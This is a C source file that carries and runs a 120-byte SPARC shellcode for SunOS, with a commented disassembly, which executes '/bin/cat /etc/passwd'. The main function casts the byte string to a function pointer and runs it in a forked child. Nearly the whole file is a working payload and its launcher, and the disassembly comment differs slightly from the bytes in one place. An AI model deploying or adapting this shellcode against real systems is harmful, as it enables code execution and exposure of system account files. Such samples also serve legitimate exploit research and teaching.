#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

/*
 * SunOS (Solaris) / (sun4u / sparc32) '/bin/cat /etc/passwd' 120 bytes
 * shellcode
 *
 * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
 *
 * Tested on: SunOS leviathan 5.6 Generic_105181-30 sun4u sparc SUNW.Ultra-1
 *
 * Disassembly of section .text:
 *
 * 00010074 <_start>:
 * 10074:   11 0b d8 9a    sethi  %hi(0x2f626800), %o0
 * 10078:   90 12 21 6e    or  %o0, 0x16e, %o0  ! 2f62696e <_end+0x2f60687e>
 * 1007c:   13 0b d8 d8    sethi  %hi(0x2f636000), %o1
 * 10080:   92 12 61 74    or  %o1, 0x174, %o1  ! 2f636174 <_end+0x2f616084>
 * 10084:   94 02 a0 01    inc  %o2
 * 10088:   94 22 a0 01    dec  %o2
 * 1008c:   d4 23 bf fc    st  %o2, [ %sp + -4 ]
 * 10090:   d2 23 bf f8    st  %o1, [ %sp + -8 ]
 * 10094:   d0 23 bf f4    st  %o0, [ %sp + -12 ]
 * 10098:   90 23 a0 0c    sub  %sp, 0xc, %o0
 * 1009c:   13 0b cb d9    sethi  %hi(0x2f2f6400), %o1
 * 100a0:   92 12 61 74    or  %o1, 0x174, %o1  ! 2f2f6574 <_end+0x2f2d6484>
 * 100a4:   15 18 cb dc    sethi  %hi(0x632f7000), %o2
 * 100a8:   94 12 a0 61    or  %o2, 0x61, %o2   ! 632f7061 <_end+0x632d6f71>
 * 100ac:   17 1c dc dd    sethi  %hi(0x73737400), %o3
 * 100b0:   96 12 e3 64    or  %o3, 0x364, %o3  ! 73737764 <_end+0x73717674>
 * 100b4:   98 03 20 01    inc  %o4
 * 100b8:   98 23 20 01    dec  %o4
 * 100bc:   d8 23 bf f0    st  %o4, [ %sp + -16 ]
 * 100c0:   d6 23 bf ec    st  %o3, [ %sp + -20 ]
 * 100c4:   d4 23 bf e8    st  %o2, [ %sp + -24 ]
 * 100c8:   d2 23 bf e4    st  %o1, [ %sp + -28 ]
 * 100cc:   92 23 a0 1c    sub  %sp, 0x1c, %o1
 * 100d0:   d8 23 bf e0    st  %o4, [ %sp + -32 ]
 * 100d4:   d2 23 bf dc    st  %o1, [ %sp + -36 ]
 * 100d8:   d0 23 bf d8    st  %o0, [ %sp + -40 ]
 * 100dc:   92 23 a0 28    sub  %sp, 0x28, %o1
 * 100e0:   94 22 80 0a    sub  %o2, %o2, %o2
 * 100e4:   82 10 20 3b    mov  0x3b, %g1
 * 100e8:   91 d0 20 10    ta  0x10
 */

#ifndef __sect_shellcode
#define __sect_shellcode __attribute__((section(".sect.shellcode")))
#endif

#ifndef __cold
#define __cold __attribute__((cold))
#endif

#ifndef __unvalidate_cfi
#define __unvalidate_cfi
#endif

#ifndef __unsafe
#define __unsafe __sect_shellcode __cold __unvalidate_cfi
#endif

#ifndef unused
#define unused(x) ((void)(x))
#endif

static char *shellcode = "\x11\x0b\xd8\x9a\x90\x12\x21\x6e"
                         "\x13\x0b\xd8\xd8\x92\x12\x61\x74"
                         "\x94\x02\xa0\x01\x94\x22\xa0\x01"
                         "\xd4\x23\xbf\xfc\xd2\x23\xbf\xf8"
                         "\xd0\x23\xbf\xf4\x90\x23\xa0\x0c"
                         "\x13\x0b\xcb\xd9\x92\x12\x61\x74"
                         "\x15\x18\xcb\xdc\x94\x12\xa0\x61"
                         "\x17\x1c\xdc\xdd\x96\x12\xe3\x64"
                         "\x98\x10\x20\xc0\x98\x1b\x20\xc0"
                         "\xd8\x23\xbf\xf0\xd6\x23\xbf\xec"
                         "\xd4\x23\xbf\xe8\xd2\x23\xbf\xe4"
                         "\x92\x23\xa0\x1c\xd8\x23\xbf\xe0"
                         "\xd2\x23\xbf\xdc\xd0\x23\xbf\xd8"
                         "\x92\x23\xa0\x28\x94\x22\x80\x0a"
                         "\x82\x10\x20\x3b\x91\xd0\x20\x10";

int __unsafe main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;

  // add 2 unused parameters to make
  // %fp register properly aligned.
  void (*trigger)(int a, int b);

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __fallback;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  trigger = (void (*)(int, int))shellcode;

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __fallback;
  }

  if (!pid) {
    printf("[*] Executing the shellcode..\n");
    trigger(0, 0);
  } else {
    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
  }

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  return 0;

__fallback:
  return ret;
}
